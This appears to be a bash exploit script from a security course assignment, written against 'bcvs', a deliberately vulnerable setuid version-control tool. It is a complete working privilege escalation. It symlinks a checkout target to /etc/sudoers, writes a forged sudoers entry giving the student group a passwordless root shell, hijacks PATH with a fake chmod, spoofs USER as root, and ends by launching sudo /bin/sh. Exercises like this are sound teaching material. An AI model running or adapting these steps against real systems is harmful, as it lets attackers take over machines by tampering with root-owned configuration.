#!/bin/bash

## ------------------------ Sploit Description ------------------------------ ##
## This sploit generally exploits bad path checking in bcvs. See sploit3.txt
## for more.
##
## Note: After you run this you should reset the sudoers file by hand or
##      by using the reset script in ~/repo/scripts/reset_sudoers.sh . This
##      needs to be run as root.
## -------------------------------------------------------------------------- ##


# Setup environment
rm -rf sploit3_dir
mkdir -p sploit3_dir
cd sploit3_dir
mkdir -p .bcvs
touch .bcvs/block.list

rm -rf .bcvs/sudoers
touch .bcvs/sudoers
ln -sf /etc/sudoers sudoers

cat <<END_OF_STR > ".bcvs/sudoers"
Defaults env_reset
root ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL
%sudo ALL=(ALL:ALL) ALL
%student ALL=NOPASSWD: /bin/sh
#includedir /etc/sudoers.d
END_OF_STR

# Now setup dummy script to avoid the chmod
# Could just nuke the path as well
PATH=.:$PATH
cat <<EOS > "chmod"
#!/bin/bash
echo "Who cares what permissions you have"
EOS

# Make sure they are executable or the OS will continue down the path
chmod +x "./chmod"

export USER="root"

echo "gotcha" | /opt/bcvs/bcvs co sudoers

echo "Starting shell as root"
sudo /bin/sh
